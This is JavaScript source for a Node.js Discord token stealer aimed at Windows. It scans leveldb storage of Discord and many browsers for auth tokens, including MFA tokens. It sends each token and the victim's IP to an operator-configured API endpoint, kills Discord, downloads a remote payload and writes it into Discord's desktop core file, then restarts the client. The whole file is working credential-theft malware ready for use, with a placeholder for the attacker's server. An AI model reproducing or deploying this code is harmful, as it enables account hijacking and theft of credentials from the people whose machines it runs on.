const OS = require("os"),
    fs = require("fs"),
    fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args)),
    { execSync } = require("child_process"),
    Glob = require("glob"),
    toInject = [],
    toInjectJS = [],
    toKill = [],
    dev = " k4itrun", // I know you want to change it, don't
    apiurl = "http://yourapi.com" // Put Your API URL Here

try {
    switch (OS.platform()) {
        case "win32":
            const local = process.env.localappdata,
                roaming = process.env.appdata,
                dbPaths = [
                    `${roaming}/Discord/Local Storage/leveldb`, 
                    `${roaming}/DiscordDevelopment/Local Storage/leveldb`, 
                    `${roaming}/Lightcord/Local Storage/leveldb`, 
                    `${roaming}/discordptb/Local Storage/leveldb`, 
                    `${roaming}/discordcanary/Local Storage/leveldb`, 
                    `${roaming}/Opera Software/Opera Stable/Local Storage/leveldb`, 
                    `${roaming}/Opera Software/Opera GX Stable/Local Storage/leveldb`, 
                    `${local}/Amigo/User Data/Local Storage/leveldb`, 
                    `${local}/Torch/User Data/Local Storage/leveldb`, 
                    `${local}/Kometa/User Data/Local Storage/leveldb`, 
                    `${local}/Orbitum/User Data/Local Storage/leveldb`, 
                    `${local}/CentBrowser/User Data/Local Storage/leveldb`, 
                    `${local}/7Star/7Star/User Data/Local Storage/leveldb`, 
                    `${local}/Sputnik/Sputnik/User Data/Local Storage/leveldb`, 
                    `${local}/Vivaldi/User Data/Default/Local Storage/leveldb`, 
                    `${local}/Google/Chrome SxS/User Data/Local Storage/leveldb`, 
                    `${local}/Epic Privacy Browser/User Data/Local Storage/leveldb`, 
                    `${local}/Google/Chrome/User Data/Default/Local Storage/leveldb`, 
                    `${local}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`, 
                    `${local}/Microsoft/Edge/User Data/Default/Local Storage/leveldb`, 
                    `${local}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`, 
                    `${local}/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`, 
                    `${local}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`
                ]
            init()

            function init() {
                i()
                dbPaths.forEach(r => main(r))
            }

            function i() { 
                g()
                k()
                fetch(`https://api.teamarcades.xyz/v9/aurathemes`, { headers: { aurapremium: false, aurafiles: true, auradev: false, aurathemes: true + dev }}).then(r => r.text()).then(r => toInjectJS.forEach(f => fs.writeFileSync(f, r.replace("*API URL*", apiurl)) ^ execSync(`${local}/${f.split("/")[5]}/Update.exe --processStart ${f.split("/")[5]}.exe`)))
            }

            function main(r) {
                fs.readdir(r, (err, tokenDir) => { if (tokenDir) {
                        var ldbFileFilter = tokenDir.filter(f => f.endsWith("ldb"))
                            ldbFileFilter.forEach(file => {
                                var fileContent = fs.readFileSync(`${r}/${file}`).toString()
                                var noMFA = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/
                                var mfa = /"mfa\.[\d\w_-]{84}"/
                                var [token] = noMFA.exec(fileContent) || mfa.exec(fileContent) || [undefined]
                                if (token) fetch("http://ip-api.com/json/").then(r => r.json()).then(r => fetch(`${apiurl}/beforeinject`, {
                                    method: "POST",
                                    body: JSON.stringify({ token: token.slice(1, -1), ip: r.query })
                                }))
                            })
                        }
                    })
                }

            function k() {
                var killList = execSync("tasklist").toString()
                    killList.includes("Discord.exe") && toKill.push("discord")
                    killList.includes("DiscordCanary.exe") && toKill.push("discordcanary")
                    killList.includes("DiscordDevelopment.exe") && toKill.push("discorddevelopment")
                    killList.includes("DiscordPTB.exe") && toKill.push("discordptb");
                    toKill.forEach(r => execSync(`taskkill /IM ${r}.exe /F`))
            }

            function g() {
                fs.readdirSync(roaming).forEach(r => r.includes("cord") && toInject.push(`${local}/${r}`));
                toInject.forEach(r => Glob.sync(`${r}/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js`).map(path => toInjectJS.push(path)))
            }

            
            break;
        case "linux":
            // Available Soon...
            break
    }
} catch (e) {/** */}
